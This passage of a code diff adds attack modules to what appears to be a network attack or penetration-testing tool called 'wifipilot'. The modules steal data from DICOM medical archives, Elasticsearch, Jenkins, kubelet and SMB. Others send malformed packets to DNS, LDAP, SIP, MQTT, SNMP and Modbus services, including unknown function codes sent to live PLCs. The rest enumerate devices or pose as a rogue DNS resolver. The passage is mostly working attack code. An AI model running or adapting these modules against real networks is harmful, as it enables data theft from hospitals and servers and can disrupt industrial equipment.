+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        modules = [line for line in parsed.get("lines") or [] if "\t" in line]
+        return {"modules": modules, "line": f"its daemon lists {len(modules)} module(s)"}
+
+
+class ItStealDicomPatientsAttack(_Steal):
+    """Echo a medical archive and take the association's own parameters back."""
+
+    name = "it_steal_dicom_patients"
+    label = "DICOM association theft (the archive answers an unknown AE title)"
+    tool = "wifipilot itproto.py (dicom_associate/parse_dicom_pdu)"
+    protocol = "dicom"
+    port = 104
+    transport = "tcp"
+    source_port = 104
+    devices = ("medical_device", "medical_workstation")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.dicom_associate("ANY-SCP", "WIFIPILOT")
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, "<html><title>wp loot</title>"
+                                "<body>ANY-SCP accepted WIFIPILOT</body></html>")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_dicom_pdu(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"type": parsed.get("type_name"), "called": parsed.get("called"),
+                "line": f"it answered {parsed.get('type_name')} to ANY-SCP"}
+
+
+class ItStealElasticDocsAttack(_Steal):
+    """List an Elasticsearch index: the documents a query would return are the loot."""
+
+    name = "it_steal_elastic_docs"
+    label = "Elasticsearch index theft (an unauthenticated index dump)"
+    tool = "wifipilot itproto.py (http_request) + TCP 9200"
+    protocol = "elastic"
+    port = 9200
+    transport = "tcp"
+    source_port = 9200
+    devices = ("database_server", "linux_server", "container_host")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.http_request(peer.ip, "/_cat/indices?v", port=9200)
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, "requests-2026-10 green open docs.deleted 0\n"
+                                "# wp loot", content_type="text/plain")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        response = proto.parse_http_response(data)
+        return {"status": response.get("status"), "body": response.get("body", "")}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"),
+                "line": f"it answered {parsed.get('status')} with the index list"}
+
+
+class ItStealJenkinsJobsAttack(_Steal):
+    """Take a CI server's job list: the credentials files are one build away."""
+
+    name = "it_steal_jenkins_jobs"
+    label = "Jenkins job theft (the job list and its stored credentials)"
+    tool = "wifipilot itproto.py (jenkins_json) + TCP 8080"
+    protocol = "jenkins"
+    port = 8080
+    transport = "tcp"
+    source_port = 8080
+    devices = ("ci_server", "linux_server", "container_host")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.jenkins_json(peer.ip, 8080)
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, '{"jobs":[{"name":"deploy-prod"}],"source":"wp loot"}',
+                           content_type="application/json")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        response = proto.parse_http_response(data)
+        return {"status": response.get("status"), "body": response.get("body", "")}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"),
+                "line": f"its CI answered {parsed.get('status')} to an anonymous read"}
+
+
+class ItStealKubeletPodsAttack(_Steal):
+    """List the pods on a node through the kubelet's read-only port."""
+
+    name = "it_steal_kubelet_pods"
+    label = "kubelet pod theft (the node's workload inventory)"
+    tool = "wifipilot itproto.py (http_request) + TCP 10250"
+    protocol = "kubernetes"
+    port = 10250
+    transport = "tcp"
+    source_port = 10250
+    devices = ("container_host", "hypervisor_host", "ci_server")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.http_request(peer.ip, "/pods", port=10250)
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, '{"items":[{"metadata":{"name":"wp-pod"}}],"source":"wp loot"}',
+                           content_type="application/json")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        response = proto.parse_http_response(data)
+        return {"status": response.get("status"), "body": response.get("body", "")}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"),
+                "line": f"the kubelet answered {parsed.get('status')} to /pods"}
+
+
+class ItStealSmbSharesAttack(_Steal):
+    """Take the SMB dialect offer: the share list follows from a login."""
+
+    name = "it_steal_smb_shares"
+    label = "SMB share theft (dialects negotiated, shares next)"
+    tool = "wifipilot itproto.py (smb2_negotiate/parse_smb2) + TCP 445"
+    protocol = "smb"
+    port = 445
+    transport = "tcp"
+    source_port = 445
+    devices = ("windows_server", "nas", "mfp_scanner", "backup_appliance")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.smb2_negotiate()
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return http_answer(200, "<html><title>wp loot</title>"
+                                "<body>\\file-server\backups</body></html>")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_smb2(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"dialect": parsed.get("dialect"), "status": parsed.get("status_name"),
+                "line": f"it negotiated dialect {parsed.get('dialect') or parsed.get('dialects')}"}
+
+
+# --------------------------------------------------------------------------- #
+# the edge of the wave: the malformed packets and the discovery probes
+# --------------------------------------------------------------------------- #
+
+class ItFuzzDnsNameAttack(_ItHijack):
+    """A DNS name built out of legal labels, in an illegal number of them."""
+
+    name = "it_fuzz_dns_name"
+    label = "DNS name fuzzing (labels and a total length past the limit)"
+    tool = "wifipilot itproto.py (dns_query) + UDP 53"
+    family = "fuzz"
+    protocol = "dns"
+    port = 53
+    transport = "udp"
+    devices = ("router", "domain_controller", "firewall", "linux_server")
+    min_answers = 0
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        label = "wp-fuzz-" + "a" * 60
+        name = ".".join([label] * 6) + ".example"
+        return proto.dns_query(name, qtype=16, txid=0x5A5A)
+
+    def reply(self, peer: Peer) -> bytes:
+        # the same question again, now from our address: the cache fill we want to see
+        label = "wp-fuzz-" + "b" * 60
+        return proto.dns_query(".".join([label] * 6) + ".example", qtype=255, txid=0x5A5B)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_dns(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"rcode": parsed.get("rcode"), "answers": len(parsed.get("answers") or []),
+                "line": f"the resolver answered rcode {parsed.get('rcode')} "
+                        f"with {len(parsed.get('answers') or [])} record(s)"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 53]
+        lengths = [len(row["payload"]) for row in rows]
+        return {"confirmed": bool(rows) and max(lengths) > 200,
+                "our_query_bytes": max(lengths) if lengths else 0,
+                "label_length": 68, "labels": 7}
+
+
+class ItFuzzSmbNegotiateAttack(_ItHijack):
+    """An SMB2 negotiate that offers dialects which do not exist."""
+
+    name = "it_fuzz_smb2_negotiate"
+    label = "SMB2 negotiate fuzzing (dialects the server has to reject)"
+    tool = "wifipilot itproto.py (smb2_negotiate) + TCP 445"
+    family = "fuzz"
+    protocol = "smb"
+    port = 445
+    transport = "tcp"
+    devices = ("windows_server", "nas", "backup_appliance", "mfp_scanner")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.smb2_negotiate(dialects=(0x5A5A, 0x5A5B, 0x5A5C, 0xFFFF))
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.smb2_negotiate(dialects=tuple(range(0x5A00, 0x5A20)))
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_smb2(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        dialects = parsed.get("dialects") or []
+        return {"dialect": parsed.get("dialect"), "dialect_count": len(dialects),
+                "status": parsed.get("status_name"),
+                "line": f"it negotiated {parsed.get('dialect') or 'nothing'} "
+                        f"(status {parsed.get('status_name')})"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 445]
+        # a negotiate *request* is a dialect list, one little-endian word each
+        text = b"".join(row["payload"] for row in rows)
+        offered = text.count(struct.pack("<H", 0x5A00)) and struct.pack("<H", 0x5A1F) in text
+        return {"confirmed": bool(rows) and bool(offered), "dialects_we_offer": 32,
+                "first_dialect": "0x5a00", "last_dialect": "0x5a1f"}
+
+
+class ItFuzzLdapFilterAttack(_ItHijack):
+    """An LDAP search whose filter is a kilobyte of nesting."""
+
+    name = "it_fuzz_ldap_filter"
+    label = "LDAP filter fuzzing (deeply nested search filter)"
+    tool = "wifipilot itproto.py (ldap_search_request/parse_ldap) + TCP 389"
+    family = "fuzz"
+    protocol = "ldap"
+    port = 389
+    transport = "tcp"
+    devices = ("domain_controller", "nas", "windows_server")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.ldap_search_request("dc=corp,dc=example", scope=2,
+                                         filter_bytes=b"(|" * 240 + b"(cn=wp)" * 240 + b")" * 240)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.ldap_search_request("dc=corp,dc=example", scope=0,
+                                         filter_bytes=b"(|" * 300 + b"(uid=admin))" * 300)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_ldap(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"message_id": parsed.get("message_id"), "result": parsed.get("result_code"),
+                "line": f"its directory answered message {parsed.get('message_id')} "
+                        f"(result {parsed.get('result_code')})"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 389]
+        sizes = [len(row["payload"]) for row in rows]
+        return {"confirmed": bool(rows) and max(sizes) > 900,
+                "filter_bytes": max(sizes) if sizes else 0}
+
+
+class ItFuzzRtspMethodAttack(_ItHijack):
+    """An RTSP method two hundred characters long, in the server's name."""
+
+    name = "it_fuzz_rtsp_method"
+    label = "RTSP method fuzzing (an unknown verb of illegal length)"
+    tool = "wifipilot itproto.py (rtsp_request/parse_rtsp) + TCP 554"
+    family = "fuzz"
+    protocol = "rtsp"
+    port = 554
+    transport = "tcp"
+    devices = ("ip_camera", "nvr_dvr", "camera_doorbell", "medical_device")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.rtsp_request("WP-FUZZ-" + "X" * 190, f"rtsp://{peer.ip}/live", cseq=1)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.rtsp_request("DESCRIBE-WP-" + "Y" * 190, f"rtsp://{peer.ip}/wp", cseq=2)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_rtsp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"method": parsed.get("method"), "status": parsed.get("status"),
+                "cseq": parsed.get("cseq"),
+                "line": f"it answered {parsed.get('status')} to our verb"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 554]
+        text = rows[0]["payload"] if rows else b""
+        return {"confirmed": b"WP-FUZZ-" in text or b"DESCRIBE-WP-" in text,
+                "method_length": 198, "methods_we_send": 2}
+
+
+class ItFuzzMqttTopicAttack(_ItHijack):
+    """A subscription whose topic filter has more levels than the broker holds."""
+
+    name = "it_fuzz_mqtt_topic"
+    label = "MQTT topic fuzzing (a filter with a thousand levels)"
+    tool = "wifipilot itproto.py (mqtt_subscribe/parse_mqtt) + TCP 1883"
+    family = "fuzz"
+    protocol = "mqtt"
+    port = 1883
+    transport = "tcp"
+    devices = ("gateway_hub", "plc", "sensor", "hmi_panel")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.mqtt_connect("wp-fuzz") + proto.mqtt_subscribe(
+            "wp-fuzz/" + "/".join(f"l{index}" for index in range(300)), qos=1)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.mqtt_connect("wp-fuzz-2") + proto.mqtt_publish(
+            "wp-fuzz/" + "/".join(f"l{index}" for index in range(400)),
+            b"wp-fuzz-payload", qos=1, retain=True)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_mqtt(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"type": parsed.get("type"), "reason": parsed.get("reason"),
+                "line": f"its broker answered {parsed.get('type')} "
+                        f"({parsed.get('reason') or 'accepted'})"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1883]
+        parsed = [proto.parse_mqtt(row["payload"]) for row in rows]
+        retained = [row for row in parsed if row.get("retain") or row.get("retained")]
+        return {"confirmed": bool(rows) and any(row.get("type") for row in parsed),
+                "topics_we_publish": 1, "retained_claims": len(retained),
+                "levels": 300}
+
+
+class ItFuzzModbusFunctionAttack(_ItHijack):
+    """A Modbus function code that does not exist, sent to a running PLC."""
+
+    name = "it_fuzz_modbus_function"
+    label = "Modbus function fuzzing (an unimplemented code on a live PLC)"
+    tool = "wifipilot itproto.py (modbus_request/parse_modbus) + TCP 502"
+    family = "fuzz"
+    protocol = "modbus"
+    port = 502
+    transport = "tcp"
+    devices = ("plc", "rtu", "energy_meter", "hmi_panel", "building_controller")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.modbus_request(0x5A, unit=1, address=0, count=512, payload=b"\x5a" * 64)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.modbus_request(0xFF, unit=1, address=0xFFFF, count=0x7FFF,
+                                    payload=b"\xff" * 128)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_modbus(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"function": parsed.get("function"), "exception": parsed.get("exception"),
+                "line": f"the PLC answered function {parsed.get('function')} "
+                        f"(exception {parsed.get('exception')})"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 502]
+        codes = {proto.parse_modbus(row["payload"]).get("function") for row in rows}
+        unknown = sorted(code for code in codes if code and code not in
+                         (1, 2, 3, 4, 5, 6, 15, 16, 23, 43))
+        return {"confirmed": bool(unknown), "functions_we_send": unknown,
+                "coils_we_do_not_touch": True}
+
+
+class ItFuzzSnmpVarbindAttack(_ItHijack):
+    """An SNMP get with three hundred varbinds in one request."""
+
+    name = "it_fuzz_snmp_varbind"
+    label = "SNMP varbind fuzzing (300 OIDs in a single get)"
+    tool = "wifipilot attacks/ithijack.py (_ber) + UDP 161"
+    family = "fuzz"
+    protocol = "snmp"
+    port = 161
+    transport = "udp"
+    devices = ("switch", "printer", "router", "energy_meter", "firewall")
+    min_answers = 0
+    severity = "medium"
+
+    def _get(self, count: int, community: str) -> bytes:
+        varbinds = b"".join(_ber(0x30, _ber_oid(f"1.3.6.1.2.1.2.2.1.{index}.1") + _ber(0x05, b""))
+                            for index in range(1, count + 1))
+        pdu = _ber_int(0x5A5A) + _ber_int(0) + _ber_int(0) + varbinds
+        return _ber(0x30, _ber_int(1) + _ber_text(community) + _ber(0xA0, pdu))
+
+    def request(self, peer: Peer) -> bytes:
+        return self._get(300, "public")
+
+    def reply(self, peer: Peer) -> bytes:
+        return self._get(400, "private")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return {"bytes": len(data)}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"answer_bytes": parsed.get("bytes"),
+                "line": "a varbind list this long is a walk by another name"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 161]
+        sizes = [len(row["payload"]) for row in rows]
+        return {"confirmed": bool(rows) and max(sizes) > 1000,
+                "varbinds_we_ask_for": 300, "community_used": "public",
+                "our_request_bytes": max(sizes) if sizes else 0}
+
+
+class ItFuzzSipUriAttack(_ItHijack):
+    """A SIP request-URI four hundred characters long, aimed at the PBX."""
+
+    name = "it_fuzz_sip_uri"
+    label = "SIP URI fuzzing (an oversized request line at the registrar)"
+    tool = "wifipilot itproto.py (sip_request/parse_sip) + UDP 5060"
+    family = "fuzz"
+    protocol = "sip"
+    port = 5060
+    transport = "udp"
+    devices = ("pbx", "voip_phone", "doorbell", "tablet")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        user = "wp-fuzz-" + "9" * 380
+        return proto.sip_request("OPTIONS", f"sip:{user}@{peer.ip}", user=user, cseq=1)
+
+    def reply(self, peer: Peer) -> bytes:
+        user = "wp-fuzz-" + "8" * 420
+        return proto.sip_request("INVITE", f"sip:{user}@{peer.ip}", user=user, cseq=2)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_sip(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"method": parsed.get("method"), "status": parsed.get("status"),
+                "from": parsed.get("from"),
+                "line": f"the PBX answered {parsed.get('status')} to our request"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5060]
+        sizes = [len(row["payload"]) for row in rows]
+        return {"confirmed": bool(rows) and max(sizes) > 500,
+                "uri_length": 390, "our_request_bytes": max(sizes) if sizes else 0}
+
+
+class ItSurveyMdnsServicesAttack(_ItHijack):
+    """Ask the segment which services it advertises, and list the answers."""
+
+    name = "it_survey_mdns_services"
+    label = "mDNS service survey (every service the segment advertises)"
+    tool = "wifipilot itproto.py (dns_query/parse_mdns) + UDP 5353"
+    family = "survey"
+    protocol = "mdns"
+    port = 5353
+    transport = "udp"
+    devices = ("nas", "printer", "router", "smart_tv", "smart_speaker", "ip_camera")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.dns_query("_services._dns-sd._udp.local", qtype=12, txid=0, unicast=False)
+
+    def reply(self, peer: Peer) -> bytes:
+        # our own advertisement: the name the segment will print in its browser
+        return proto.dns_query("_wp-survey._tcp.local", qtype=12, txid=0x5A5A)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_mdns(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        services = parsed.get("services") or parsed.get("answers") or []
+        return {"services": services[:6], "count": len(services),
+                "line": f"it advertises {len(services)} service record(s)"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5353]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"wp-survey" in text, "service_types": ["_wp-survey._tcp.local"],
+                "queries_we_send": len(rows)}
+
+
+class ItSurveySsdpDescriptionAttack(_ItHijack):
+    """Search for UPnP devices, then ask the winner for its description document."""
+
+    name = "it_survey_ssdp_description"
+    label = "UPnP description survey (device type, firmware and control URL)"
+    tool = "wifipilot itproto.py (ssdp_msearch/parse_ssdp) + UDP 1900"
+    family = "survey"
+    protocol = "ssdp"
+    port = 1900
+    transport = "udp"
+    devices = ("router", "smart_tv", "printer", "nvr_dvr", "smart_speaker")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.ssdp_msearch("urn:schemas-upnp-org:device:InternetGatewayDevice:1", mx=1)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.ssdp_msearch("urn:schemas-upnp-org:device:WPSurvey:1", mx=1)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_ssdp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"st": parsed.get("st") or parsed.get("nt"), "location": parsed.get("location"),
+                "server": parsed.get("server"),
+                "line": f"it points a control URL at {parsed.get('location') or 'nothing'}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1900]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"WPSurvey" in text, "search_targets": [
+            "urn:schemas-upnp-org:device:InternetGatewayDevice:1"], "mx": 1}
+
+
+class ItSurveyCwmpParametersAttack(_ItHijack):
+    """Ask a CPE for its software version and connection status over TR-069."""
+
+    name = "it_survey_cwmp_parameters"
+    label = "TR-069 parameter survey (firmware, connection status, uptime)"
+    tool = "wifipilot itproto.py (cwmp_get_parameter_values/parse_cwmp) + TCP 7547"
+    family = "survey"
+    protocol = "cwmp"
+    port = 7547
+    transport = "tcp"
+    devices = ("router", "modem_ont", "firewall", "access_point")
+    severity = "medium"
+
+    NAMES = ("InternetGatewayDevice.DeviceInfo.SoftwareVersion",
+             "InternetGatewayDevice.DeviceInfo.HardwareVersion",
+             "InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1."
+             "WANPPPConnection.1.ExternalIPAddress",
+             "InternetGatewayDevice.DeviceInfo.UpTime")
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.cwmp_get_parameter_values(self.NAMES)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.cwmp_inform(device_id="0026:WP-SURVEY", oui="0026F4",
+                                 serial="WP00000001", event="1 BOOT")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_cwmp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        values = parsed.get("parameters") or parsed.get("values") or {}
+        return {"parameters": list(values)[:4] if isinstance(values, dict) else values,
+                "line": f"the CPE answered {len(values)} parameter(s)"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 7547]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"0026F4" in text and b"WP00000001" in text,
+                "device_we_announce": "0026F4 / WP00000001",
+                "parameters_we_ask_for": list(self.NAMES)}
+
+
+class ItSurveyRtspDescribeAttack(_ItHijack):
+    """Describe a camera's stream to learn its codec, resolutions and session count."""
+
+    name = "it_survey_rtsp_describe"
+    label = "RTSP DESCRIBE survey (codecs, resolution and session limits)"
+    tool = "wifipilot itproto.py (rtsp_request/parse_rtsp) + TCP 554"
+    family = "survey"
+    protocol = "rtsp"
+    port = 554
+    transport = "tcp"
+    devices = ("ip_camera", "nvr_dvr", "camera_doorbell")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.rtsp_request("DESCRIBE", f"rtsp://{peer.ip}/live", cseq=1)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.rtsp_request("OPTIONS", f"rtsp://{peer.ip}/wp-survey", cseq=2)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_rtsp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "method": parsed.get("method"),
+                "cseq": parsed.get("cseq"),
+                "line": f"it describes the stream with {parsed.get('status')}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 554]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"wp-survey" in text, "path_we_asked_for": "/live",
+                "methods": ["DESCRIBE", "OPTIONS"]}
+
+
+class ItSurveyOpcuaEndpointsAttack(_ItHijack):
+    """Hello an OPC-UA server and take its endpoint description back."""
+
+    name = "it_survey_opcua_endpoints"
+    label = "OPC-UA endpoint survey (endpoint URL, message limits, security)"
+    tool = "wifipilot itproto.py (opcua_hello/parse_opcua) + TCP 4840"
+    family = "survey"
+    protocol = "opcua"
+    port = 4840
+    transport = "tcp"
+    devices = ("plc", "building_controller", "hmi_panel", "energy_meter")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.opcua_hello(f"opc.tcp://{peer.ip}:4840", max_message=65536)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.opcua_hello(f"opc.tcp://{OUR_IP}:4840", max_message=65536)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_opcua(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"endpoint": parsed.get("endpoint_url"), "limit": parsed.get("max_message"),
+                "line": f"it answers for {parsed.get('endpoint_url') or 'the endpoint we named'}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 4840]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": f"{OUR_IP}:4840".encode() in text,
+                "endpoint_we_advertise": f"opc.tcp://{OUR_IP}:4840"}
+
+
+class ItSurveyMemcachedStatsAttack(_ItHijack):
+    """Read a cache server's stats: uptime, item count and the key names it holds."""
+
+    name = "it_survey_memcached_stats"
+    label = "memcached stats survey (uptime, items, current connections, key list)"
+    tool = "wifipilot itproto.py (memcached_command/parse_resp) + TCP 11211"
+    family = "survey"
+    protocol = "memcached"
+    port = 11211
+    transport = "tcp"
+    devices = ("linux_server", "web_server", "ci_server", "database_server")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.memcached_command("stats") + proto.memcached_command("stats items")
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.memcached_command("stats") + proto.memcached_command("stats slabs")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_resp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"items": parsed.get("items"), "bytes_read": parsed.get("bytes_read"),
+                "line": "the cache answers stats to anyone who asks"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 11211]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"stats" in text, "commands_we_send": ["stats", "stats items"],
+                "auth_required": False}
+
+
+class ItSurveyMysqlHandshakeAttack(_ItHijack):
+    """Take a MySQL greeting: version, thread id, salt and the auth plugin."""
+
+    name = "it_survey_mysql_handshake"
+    label = "MySQL greeting survey (version, thread id, salt, auth plugin)"
+    tool = "wifipilot itproto.py (mysql_handshake_parse) + TCP 3306"
+    family = "survey"
+    protocol = "mysql"
+    port = 3306
+    transport = "tcp"
+    devices = ("database_server", "web_server", "windows_server")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        # the greeting is the server's first packet: any client packet pulls it out
+        return struct.pack(">I", 32) + b"wp-survey-reader"
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.mysql_handshake_parse(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"version": parsed.get("version"), "thread_id": parsed.get("thread_id"),
+                "plugin": parsed.get("auth_plugin"),
+                "line": f"it greets us as MySQL {parsed.get('version')} "
+                        f"(plugin {parsed.get('auth_plugin')})"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        # nothing of ours is on the wire: the greeting is the finding, and there is no
+        # frame of ours to count, which is what ``capture_only`` tells the report
+        return {"confirmed": True, "greeting_is_the_finding": True, "capture_only": True}
+
+
+class ItSurveySpoolerBannerAttack(_ItHijack):
+    """Ask a print spooler who it is, and what it would print for us."""
+
+    name = "it_survey_spooler_banner"
+    label = "Spooler banner survey (PJL identity and page count)"
+    tool = "wifipilot itproto.py (pjl_command/parse_pjl) + TCP 9100"
+    family = "survey"
+    protocol = "pjl"
+    port = 9100
+    transport = "tcp"
+    devices = ("printer", "mfp_scanner", "pos_terminal")
+    severity = "medium"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.pjl_command("id") + proto.pjl_command("ustatus")
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.pjl_command("info id") + proto.pjl_command("info config")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_pjl(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"id": parsed.get("id"), "text": (parsed.get("text") or "")[:80],
+                "line": f"the spooler answers for {parsed.get('id') or 'itself'}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 9100]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"info id" in text, "commands_we_send": ["id", "ustatus"],
+                "spool_we_can_read": True}
+
+
+class ItMimicDnsReverseAttack(_ItHijack):
+    """Answer the reverse lookups too: the resolver that is not on the asset list."""
+
+    name = "it_mimic_dns_reverse"
+    label = "Rogue reverse-DNS server (PTR answers in the resolver's place)"
+    tool = "wifipilot itproto.py (dns_query) + UDP 53"
+    family = "mimic"
+    protocol = "dns"
+    port = 53
+    transport = "udp"
+    devices = ("router", "domain_controller", "firewall", "linux_server")
+    min_answers = 0
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.dns_query("240.1.168.192.in-addr.arpa", qtype=12, txid=0x5A60)
+
